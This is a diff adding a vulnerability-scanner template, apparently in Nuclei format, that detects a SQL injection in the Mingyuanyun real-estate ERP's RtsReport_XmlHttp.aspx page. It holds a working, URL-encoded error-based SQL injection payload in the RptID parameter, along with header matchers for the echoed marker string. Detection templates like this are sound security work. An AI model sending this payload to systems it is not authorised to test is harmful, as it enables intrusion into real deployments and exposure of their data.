@@ -1,0 +1,24 @@
+id: poc-yaml-mingyuanyun-erp-rtsreport-xmlhttp-aspx-sqli
+info:
+  name: 明源地产ERP RtsReport_XmlHttp.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in 明源地产ERP RtsReport_XmlHttp.aspx. The vulnerability is triggered via a specific payload in the GET parameter.
+http:
+  - method: GET
+    path:
+      - "/Report/RtsReport_XmlHttp.aspx/?ywtype=SaveGeneralParam&RptID=1%27%2B(SELECT%20CHAR(65)%2BCHAR(119)%2BCHAR(102)%2BCHAR(103)%20WHERE%204294%3D4294%20AND%203472%20IN%20(SELECT%20(CHAR(113)%2BCHAR(107)%2BCHAR(106)%2BCHAR(113)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(3472%3D3472)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(107)%2BCHAR(98)%2BCHAR(118)%2BCHAR(113))))%2B%27"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "ErrPage.aspx"
+          - "qkjqq1qkbvq"
+          - "varchar"
+          - "int"
